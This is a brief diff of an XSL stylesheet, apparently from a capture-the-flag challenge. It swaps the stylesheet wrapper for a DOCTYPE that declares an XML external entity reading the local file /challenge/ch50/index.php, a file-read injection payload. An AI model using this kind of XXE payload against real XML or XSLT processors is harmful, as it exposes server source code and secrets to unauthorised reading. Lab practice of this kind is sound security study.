@@ -1,4 +1,7 @@
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<!DOCTYPE xsl:stylesheet [
+ <!ENTITY index SYSTEM "file:///challenge/ch50/index.php" >]>
+
+<!-- <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> -->
   
   <xsl:template match="/">
     <html>
@@ -26,4 +29,4 @@
     </html>
   </xsl:template>
 
-</xsl:stylesheet>
+<!-- </xsl:stylesheet> -->
